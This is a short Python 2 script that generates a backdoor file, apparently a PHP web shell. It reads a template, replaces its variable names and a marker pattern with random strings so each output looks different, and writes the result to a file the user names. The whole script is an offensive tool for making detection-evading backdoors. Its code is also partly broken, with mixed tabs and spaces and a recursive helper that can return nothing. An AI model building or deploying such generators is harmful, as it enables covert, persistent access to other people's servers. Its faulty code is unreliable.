#!usr/bin/python

import sys,os
import string
import random

random_1 = ""
random_2 = ""
random_3 = ""
random_4 = ""

def help():
    print "generate shell : python "+ sys.argv[0] + " --generate"

def generate_num(num):
    global random_1
    global random_2
    global random_3
    global random_4
    x = 0;
    random_v = ""
    string.letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    while x != num:
        random_v += random.choice(string.letters)
        x = x + 1
    if random_1 == random_v or random_2 == random_v or random_3 == random_v or random_4 == random_v:
        generate_num(num)
    else:
        return random_v

def main():
    global random_1
    global random_2
    global random_3
    global random_4
    
    if(len(sys.argv) < 2):
        help()
    elif "--generate" in sys.argv[1]:
        output_name = raw_input('backdoor name > ')
	try:
        	with open('template/template.riwif') as files:
            		string.letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
            		shell = files.read()
            		files.seek(0)
            		random_1 = random.choice(string.letters)
            		random_2 = random.choice(string.letters)
            		random_3 = random.choice(string.letters)
            		random_4 = generate_num(1)
            		random_v = generate_num(4)
            		variable_shell = generate_num(7)
           		pattern_shell = generate_num(10)
            		shell_new = shell.replace("{{patternVar}}", "$"+variable_shell)
            		shell_new = shell_new.replace("{{$first_obj}}", "$"+random_1)
            		shell_new = shell_new.replace("{{$second_obj}}", "$"+random_2)
            		shell_new = shell_new.replace("{{$show_obj}}", "$"+random_3)
            		shell_new = shell_new.replace("{{$var_end}}", "$m")
            		shell_new = shell_new.replace("{{$functionvar}}", "$"+random_4);
            		shell_new = shell_new.replace("{{pattern}}", '@@'+pattern_shell+'@@@')
            		try:
                		backdoor = open(output_name, 'w')
                		backdoor.write(shell_new)
                		print "[+] Backdoor writed on " + output_name
            		except:
               	 		print "[-] Can't write on " + output_name
	except:
		print "Error please try new generate"
        
main()
